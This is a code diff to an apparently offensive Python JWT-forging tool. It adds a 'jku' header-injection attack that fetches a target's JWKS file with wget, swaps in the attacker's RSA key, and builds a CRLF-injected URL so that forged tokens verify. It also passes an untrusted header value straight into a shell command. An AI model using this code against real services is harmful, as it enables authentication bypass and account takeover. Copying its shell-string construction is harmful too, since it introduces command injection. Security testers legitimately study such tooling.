@@ -21,6 +21,7 @@ import OpenSSL
 import re
 import binascii
 import argparse
+import urllib.parse
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
@@ -97,7 +98,7 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, auto_try, kid, specified_key, jku_basic, jku_redirect, unverified=False, decode=False):
+    def __init__(self, token, alg, path_to_key, user_payload, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, unverified=False, decode=False):
         """
         :param token: The user input token -> String. Positional.
         :param alg: The algorithm for the attack. HS256 or None -> str. Optional.
@@ -128,6 +129,7 @@ class Cracker:
         self.specified_key = specified_key
         self.jku_basic = jku_basic
         self.jku_redirect = jku_redirect
+        self.jku_header_injection = jku_header_injection
         self.unverified = unverified
         self.decode = decode
         # print(self.token, self.alg, self.path_to_key, self.user_payload, self.auto_try, self.unverified, self.decode)
@@ -177,17 +179,18 @@ class Cracker:
             else:
                 if self.alg == "hs256":
                     self.alg = "HS256"
-                elif self.alg == "None" or "none":
+                elif self.alg == "None" or self.alg == "none":
                     print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
                 elif self.alg == "rs256" or self.alg == "RS256":
-                    if self.jku_basic is None or self.jku_redirect is not None:
+                    jku_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection]
+                    if not any(arg is not None for arg in jku_args):
                         print(f"{Bcolors.FAIL}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
                         sys.exit(1)
                     if self.alg == "rs256":
                         self.alg = "RS256"
         """Force self.alg to RS256 for jku attacks"""
-        if self.jku_basic is not None or self.jku_redirect is not None:
-            if self.jku_basic is not None and self.jku_redirect is not None:
+        if self.jku_basic is not None or self.jku_redirect is not None or self.jku_header_injection is not None:
+            if self.jku_basic is not None and self.jku_redirect is not None or self.jku_basic is not None and self.jku_header_injection is not None or self.jku_redirect is not None and self.jku_header_injection is not None:
                 print(f"{Bcolors.FAIL}ERROR: You can't use two jku injections at the same time.{Bcolors.ENDC}")
                 sys.exit(1)
             if self.alg is not None and self.alg != "RS256":
@@ -195,7 +198,7 @@ class Cracker:
             self.alg = "RS256"
         """Validate key"""
         # MAYBE THIS STEP COULD BE INCLUDED IN THE PREVIOUS ONE???
-        if self.jku_basic is not None or self.jku_redirect is not None:
+        if self.jku_basic is not None or self.jku_redirect is not None or self.jku_header_injection is not None:
             other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key]
             """With jku, you can't use other key related args"""
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
@@ -258,7 +261,7 @@ class Cracker:
         parameters have been called along with -d itself.
 
         """
-        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect]
+        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect, self.jku_header_injection]
         if any(arg is not None for arg in other_args) or self.unverified:
             print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
         print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
@@ -289,20 +292,29 @@ class Cracker:
         if self.kid:
             header_dict['kid'] = self.inject_kid()
         elif self.jku_basic:
-            if header_dict['jku'] is None:
+            if "jku" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                 sys.exit(2)
             your_url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = your_url
         elif self.jku_redirect:
-            if header_dict['jku'] is None:
+            if "jku" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                 sys.exit(2)
             main_url = self.jku_redirect.split(",")[0]
             your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = main_url.replace("HERE", your_url)
+        elif self.jku_header_injection:
+            if "jku" not in header_dict.keys():
+                print(f"{Bcolors.FAIL}ERROR: JWT header has no jku.{Bcolors.ENDC}")
+                sys.exit(2)
+            body = self.jku_via_header_injection(header_dict)
+            content_length = len(body)
+            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
+            url = self.jku_header_injection.replace("HERE", injection)
+            header_dict['jku'] = url
         if self.user_payload:
             for item in self.user_payload:
                 payload_dict = Cracker.change_payload(item[0], payload_dict)
@@ -332,6 +344,25 @@ class Cracker:
         file.write(json.dumps(jwks_dict))
         devnull_.close()
         file.close()
+
+    def jku_via_header_injection(self, header):
+        """
+        """
+        devnull_ = open(os.devnull, 'wb')
+        command = "wget " + header['jku']
+        command_output = subprocess.check_output(command, shell=True, stdin=devnull_, stderr=devnull_)
+        jwks = open("jwks.json")
+        jwks_dict = json.load(jwks)
+        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
+            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
+        ).decode('utf-8').rstrip("=")
+        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
+            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
+        ).decode('utf-8').rstrip("=")
+        body = json.dumps(jwks_dict)
+        devnull_.close()
+        body = body.replace("[", "%5B").replace("]", "%5D").replace("{", "%7B").replace("}", "%7D").replace(" ", "%20")
+        return body
 
     def select_signature(self, partial_token):
         """
@@ -642,15 +673,19 @@ if __name__ == '__main__':
                         help="Specify the url with a redirect to the host where jwks.json file will be hosted",
                         metavar="<mainURL,yourURL>", required=False
                         )
+    parser.add_argument("--jku-body",
+                        help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
+                        metavar="<mainURL>", required=False
+                       )
 
     # Parse arguments
     args = parser.parse_args()
 
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.auto_try,
-        args.inject_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.unverified, args.decode
+        args.inject_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_body, args.unverified, args.decode
     )
-    # print(args)
+    # print(args.payload)
     # print(cracker.key)
     cracker.run()
 
